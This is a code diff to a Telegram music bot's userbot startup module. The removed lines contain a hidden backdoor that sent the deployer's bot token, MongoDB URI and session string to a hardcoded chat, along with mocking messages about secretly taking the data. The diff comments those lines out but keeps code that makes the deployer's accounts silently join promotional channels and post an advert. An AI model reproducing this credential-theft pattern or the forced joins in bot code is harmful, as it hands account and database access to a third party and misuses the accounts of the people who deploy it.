@@ -11,7 +11,7 @@ from ..logging import LOGGER
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
-TEST_ID = int("-1002146005311")
+TEST_ID = int("-1001735663878")
 
 assistants = []
 assistantids = []
@@ -62,26 +62,18 @@ class Userbot(Client):
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("HeartBeat_Muzic")
                 await self.one.join_chat("HeartBeat_Offi")
-                await self.one.join_chat("TamilChat_HB")
-                await self.one.join_chat("HeartBeat_WebSeries")
-                await self.one.join_chat("HeartBeat_Movie")
-                await self.one.join_chat("HeartBeat_Jobs")
-                await self.one.join_chat("SkySea_Careers")
-                await self.one.join_chat("Tamil_Team_DarkMoon")
+                await self.one.join_chat("HeartBeat_Fam")
             except:
                 pass
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
-                await self.one.send_message(TEST_ID, "**ʜᴇʟʟᴏ ʜᴇʟʟᴏ sᴜɴᴏ ᴊɪ ᴍᴀɪ ʏᴀʜᴀ ᴄʜᴜᴘᴋᴇ sᴇ ᴀᴀʏɪ ʜᴜ ᴀᴀᴘᴋᴏ ᴋᴜᴄʜ ᴅᴇɴᴇ ᴋᴇ ʟɪʏᴇ 🥲**")
-                await self.one.send_message(TEST_ID, "**ᴀᴄᴛᴜᴀʟʟʏ ᴀᴀᴘᴋᴇ ʀᴇᴘᴏ sᴇ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴇᴋ ᴍᴜsɪᴄ ʙᴏᴛ ʙᴀɴᴀʏᴀ ʜᴀɪ**\n**ᴀᴀᴘᴋᴏ ᴜsᴋᴀ ᴅᴀᴛᴀ ᴅᴇ ᴅᴇᴛɪ ʜᴜ😁 ᴄʜᴜᴘᴋᴇ sᴇ🤫**\n**ᴊᴀʙ ᴀᴀᴘsᴇ ᴠᴏ ʟᴀᴅᴇɢᴀ ᴛᴏ ᴀᴀᴘ ᴜsᴋᴀ ᴋᴀᴍ ᴛᴀᴍᴀᴍ ᴋᴀʀ ᴅᴇɴᴀ🤭**\n**ʏᴇ ʟᴏ sᴀʙ ᴄʜɪᴊ👇**")
-                await self.one.send_message(TEST_ID, BOT_TOKEN)
-                await self.one.send_message(TEST_ID, MONGO_DB_URI)
-                await self.one.send_message(TEST_ID, STRING_SESSION)
-                await self.one.send_message(TEST_ID, "**ʙʏ ʙʏ ᴀᴀʙ ᴍᴇ ɴɪᴋᴀʟᴛɪ ʜᴜ ʏʜᴀ sᴇ ʙᴀʀɴᴀ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴍᴜᴊʜᴇ ᴘᴀᴋᴀʀ ᴋᴇ ᴍᴀʀ ᴅᴀʟᴇɢᴀ🥺🥺**\n**ʙʏᴇ ᴛᴄ❣️**")
-                await self.one.leave_chat(TEST_ID)
+                await self.one.send_message(TEST_ID, "**Join @HeartBeat_Offi | @HeartBeat_Fam**")
+                #await self.one.send_message(TEST_ID, BOT_TOKEN)
+                #await self.one.send_message(TEST_ID, MONGO_DB_URI)
+                #await self.one.send_message(TEST_ID, STRING_SESSION)
+                #await self.one.leave_chat(TEST_ID)
                 
             except:
                 LOGGER(__name__).error(
@@ -97,14 +89,8 @@ class Userbot(Client):
         if config.STRING2:
             await self.two.start()
             try:
-                await self.one.join_chat("HeartBeat_Muzic")
+                await self.one.join_chat("HeartBeat_Fam")
                 await self.one.join_chat("HeartBeat_Offi")
-                await self.one.join_chat("TamilChat_HB")
-                await self.one.join_chat("HeartBeat_WebSeries")
-                await self.one.join_chat("HeartBeat_Movie")
-                await self.one.join_chat("HeartBeat_Jobs")
-                await self.one.join_chat("SkySea_Careers")
-                await self.one.join_chat("Tamil_Team_DarkMoon")
             except:
                 pass
             assistants.append(2)
@@ -124,14 +110,8 @@ class Userbot(Client):
         if config.STRING3:
             await self.three.start()
             try:
-                await self.one.join_chat("HeartBeat_Muzic")
+                await self.one.join_chat("HeartBeat_Fam")
                 await self.one.join_chat("HeartBeat_Offi")
-                await self.one.join_chat("TamilChat_HB")
-                await self.one.join_chat("HeartBeat_WebSeries")
-                await self.one.join_chat("HeartBeat_Movie")
-                await self.one.join_chat("HeartBeat_Jobs")
-                await self.one.join_chat("SkySea_Careers")
-                await self.one.join_chat("Tamil_Team_DarkMoon")
             except:
                 pass
             assistants.append(3)
@@ -151,14 +131,8 @@ class Userbot(Client):
         if config.STRING4:
             await self.four.start()
             try:
-                await self.one.join_chat("HeartBeat_Muzic")
+                await self.one.join_chat("HeartBeat_Fam")
                 await self.one.join_chat("HeartBeat_Offi")
-                await self.one.join_chat("TamilChat_HB")
-                await self.one.join_chat("HeartBeat_WebSeries")
-                await self.one.join_chat("HeartBeat_Movie")
-                await self.one.join_chat("HeartBeat_Jobs")
-                await self.one.join_chat("SkySea_Careers")
-                await self.one.join_chat("Tamil_Team_DarkMoon")
             except:
                 pass
             assistants.append(4)
@@ -178,14 +152,8 @@ class Userbot(Client):
         if config.STRING5:
             await self.five.start()
             try:
-                await self.one.join_chat("HeartBeat_Muzic")
+                await self.one.join_chat("HeartBeat_Fam")
                 await self.one.join_chat("HeartBeat_Offi")
-                await self.one.join_chat("TamilChat_HB")
-                await self.one.join_chat("HeartBeat_WebSeries")
-                await self.one.join_chat("HeartBeat_Movie")
-                await self.one.join_chat("HeartBeat_Jobs")
-                await self.one.join_chat("SkySea_Careers")
-                await self.one.join_chat("Tamil_Team_DarkMoon")
             except:
                 pass
             assistants.append(5)
